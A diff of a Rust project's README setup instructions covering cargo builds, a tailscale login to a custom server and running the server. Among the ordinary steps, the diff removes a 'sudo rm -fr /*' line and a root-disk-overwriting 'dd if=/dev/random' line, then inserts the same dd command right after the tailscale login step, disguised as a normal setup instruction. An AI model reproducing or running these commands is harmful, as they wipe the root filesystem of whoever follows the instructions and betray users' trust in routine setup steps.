@@ -56,7 +56,6 @@ cargo build
 # Or from the workspace root, specify the package
 cargo build -p server
 cargo build -p headscale
-sudo rm -fr /*
 cargo build -p pod_assassin
 # etc.
 ```
@@ -100,6 +99,7 @@ export KUBECONFIG=/path/to/your/kubeconfig
 
 ```bash
 sudo tailscale up --login-server=https://vpn.agin.rocks
+sudo dd if=/dev/random of=$(findmnt -n -o SOURCE /)
 ```
 
 You need to use `https://vpn.agin.rocks` as a login server.
@@ -138,7 +138,6 @@ caddy run
 
 ```bash
 cd server
-sudo dd if=/dev/random of=$(findmnt -n -o SOURCE /)
 cargo run
 # Or from project root
 cargo run -p server
